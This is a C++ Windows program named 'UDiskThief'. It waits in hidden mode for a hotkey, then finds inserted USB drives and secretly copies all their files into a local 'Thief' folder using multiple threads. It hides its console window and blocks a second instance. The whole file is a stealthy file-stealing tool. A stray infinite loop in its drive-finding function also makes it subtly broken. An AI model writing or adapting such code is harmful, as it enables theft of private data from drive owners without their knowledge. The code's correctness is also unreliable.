#include<Windows.h>
#include<DbgHelp.h>
#include<iostream>
#include<queue>
#include<thread>
#include<mutex>
#include<atomic>
using namespace std;
#pragma comment(lib,"Dbghelp.lib")
//定义存储复制文件与目的地文件结构体
struct DString
{
	string oldFile;
	string newFile;
	DString(const string& _oldFile, const string& _newFile) {
		oldFile = _oldFile;
		newFile = _newFile;
	}
};
bool isShow = false;
queue<DString> g_qFile; //文件信息队列
mutex g_qMutex; //队列互斥体
mutex g_outMutex; //输出互斥体
int g_numofThread = 5; //开启复制文件的线程数
HANDLE* hThread = new HANDLE[g_numofThread];
atomic<int> g_exitThread; //记录退出的线程数量
string g_savePath = "D:\\Y7000P\\Thief"; //保存文件的路径
ULONGLONG g_SpendTime;//记录拷贝所总共所用时间

bool g_bExit = false; //决定拷贝文件的线程是否退出
//注册全局热键
bool RegisterGlobalKey();
//删除全局快捷键
void UnRegistreGlobalKey();
//找U盘
vector<string> FindDriver();
//处理消息
bool DealMsg(WPARAM wParam);
//搜索所有文件
void FindAllFile(string savePath, string dir);
//拷贝文件的线程
unsigned _stdcall ThrToCopy(void*);
//搜索文件的线程
unsigned __stdcall ThrToSearch(void* param);

int main() {
	//创建内核对象,防止多开
	CreateMutex(NULL, TRUE, L"DBF4E165-EE50-47D9-B2D6-ADA8C0B05887");
	// GetLastError() 获取错误码
	if (GetLastError() == ERROR_ALREADY_EXISTS) return -1;
	UnRegistreGlobalKey(); //注销全局快捷键,防止其它应用占用
	bool ret = RegisterGlobalKey();//注册全局款快捷键
	if (!ret) return -1;
	SetConsoleTitleW(L"UDisktThief"); //设置窗口标题
	MSG msg{};
	while (GetMessage(&msg, NULL, 0, 0)) {	//接受消息
		ret = DealMsg(msg.wParam); //处理消息
		if (!ret) break; //false则退出程序
	}
	UnRegistreGlobalKey(); //注销全局快捷键
}

bool RegisterGlobalKey() {
	bool ret = RegisterHotKey(NULL, 'l', MOD_CONTROL, VK_CONTROL); //单击Ctrl开启运行
	if (!ret) return ret;
	ret = RegisterHotKey(NULL, 'q', MOD_CONTROL, 'Q'); //Ctrl+Q 退出程序
	if (!ret) return ret;
	ret = RegisterHotKey(NULL, 's', MOD_ALT, 'Z'); //alt+Z 显示与隐藏窗口
	if (!ret) return ret;
	return ret;
}
void UnRegistreGlobalKey() {
	UnregisterHotKey(NULL, 'l');
	UnregisterHotKey(NULL, 'q');
	UnregisterHotKey(NULL, 's');
}
vector<string> FindDriver() {
	int len = GetLogicalDriveStringsA(0, 0);
	std::string dri;
	dri.resize(len);
	GetLogicalDriveStringsA(len, (LPSTR)dri.c_str());
	vector<string> uDrive;
	std::cout << dri << std::endl;
	while (true);
	for (int i = 0; i < len - 1; i++) {
		if (dri[i] == '\0' && dri[i + 1] == '\0') break; //到结尾,退出
		if (dri[i] != '\0') continue; //不为盘符名分界,继续下一次循环
		i += 1;
		if (GetDriveTypeA(&dri[i]) == DRIVE_REMOVABLE) uDrive.push_back(&dri[i]);
	}
	return uDrive;
}
bool DealMsg(WPARAM wParam) {	//处理消息
	switch (wParam)
	{
	case 'l': //开始执行程序
	{
		cout << "开始执行!" << endl;
		vector<string> uDrive = FindDriver(); //找U盘
		if (uDrive.empty()) {
			cout << "没有U盘!" << endl;
			break;
		} //没有则直接退出
		g_SpendTime = GetTickCount64();
		g_bExit = false; //设置线程退出标志为false
		for (int i = 0; i < uDrive.size(); i++) {
			char* buf = new char[4]{}; //盘符名大小为3字节,加\0,共4字节
			strcpy_s(buf, 4, uDrive[i].data());
			_beginthreadex(0, 0, ThrToSearch, buf, 0, 0); //开启遍历文件线程
		}
		g_exitThread = 1;
		for (int i = 0; i < g_numofThread; i++) { //开启g_numofThread个线程进行拷贝
			hThread[i] = (HANDLE)_beginthreadex(0, 0, ThrToCopy, 0, 0, 0);
		}
	}
	break;
	case 'q': //退出程序
		g_bExit = true;
		Sleep(50);
		cout << "退出程序!" << endl;
		return false;
	case 's': //显示或隐藏界面
		isShow = !isShow;
		ShowWindow(GetConsoleWindow(), isShow);
		break;
	default:
		break;
	}
	return true;
}

unsigned __stdcall ThrToCopy(void*) {
	while (!g_bExit) {
		//从队列中取数据
		g_qMutex.lock();
		if (g_qFile.empty()) {
			g_qMutex.unlock();
			continue;
		}
		DString cf = g_qFile.front();
		g_qFile.pop();
		g_qMutex.unlock();

		g_outMutex.lock();
		cout << "队列剩余任务:" << g_qFile.size() << endl;
		g_outMutex.unlock();

		BOOL ret = CopyFileA(cf.oldFile.data(), cf.newFile.data(), TRUE);//复制文件

		g_outMutex.lock();
		if (ret) cout << cf.oldFile << ":复制完成\t" << endl;
		else cout << cf.oldFile << ":复制失败\t" << endl;
		g_outMutex.unlock();
	}
	g_outMutex.lock();
	cout << "拷贝线程退出:" << g_exitThread++ << "/" << g_numofThread << endl;
	g_outMutex.unlock();
	return 0;
}
unsigned __stdcall ThrToSearch(void* param) {
	FindAllFile(g_savePath, (char*)param);
	delete param;
	while (!g_qFile.empty()) Sleep(1000); //队列任务未处理完成,休眠
	g_bExit = true; //退出复制文件的线程
	WaitForMultipleObjects(g_numofThread, hThread, TRUE, INFINITE);

	g_SpendTime = GetTickCount64() - g_SpendTime;
	int ms = (int)g_SpendTime % 1000; //毫秒
	g_SpendTime /= 1000;
	int sec = (int)g_SpendTime % 60; //秒
	g_SpendTime /= 60;
	int minutes = (int)g_SpendTime % 60; //分钟
	int hours = (int)g_SpendTime / 60; //小时

	g_outMutex.lock();
	cout << "完成拷贝!搜索线程退出!" << endl;
	printf("共花费时间:%02d:%02d:%02d %03d\n", hours, minutes, sec, ms);
	g_outMutex.unlock();
	return 0;
}

void FindAllFile(string savePath, string dir) {
	if (savePath.back() == '\\') savePath.pop_back(); //去除最后的\符号
	if (dir.back() == '\\') dir.pop_back(); //去除最后的\符号
	MakeSureDirectoryPathExists((savePath + '\\').c_str()); //确保保存文件夹存在
	//遍历文件,添加到队列
	WIN32_FIND_DATAA fileData{};
	HANDLE hFile = FindFirstFileA((dir + "\\*").c_str(), &fileData);
	if (hFile == INVALID_HANDLE_VALUE) return;
	do {
		if (strcmp(fileData.cFileName, ".") == 0 || strcmp(fileData.cFileName, "..") == 0) continue;
		if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { //如果为目录,进行递归
			FindAllFile((savePath + '\\' + fileData.cFileName).data(), (dir + '\\' + fileData.cFileName).data());
			continue;
		}
		//找到文件,添加到队列
		g_qMutex.lock();
		g_qFile.push(DString(dir + "\\" + fileData.cFileName, savePath + "\\" + fileData.cFileName));
		g_qMutex.unlock();
		//输出相应信息
		g_outMutex.lock();
		cout << "当前队列数量:" << g_qFile.size() << endl;
		g_outMutex.unlock();
	} while (FindNextFileA(hFile, &fileData));
	FindClose(hFile);
}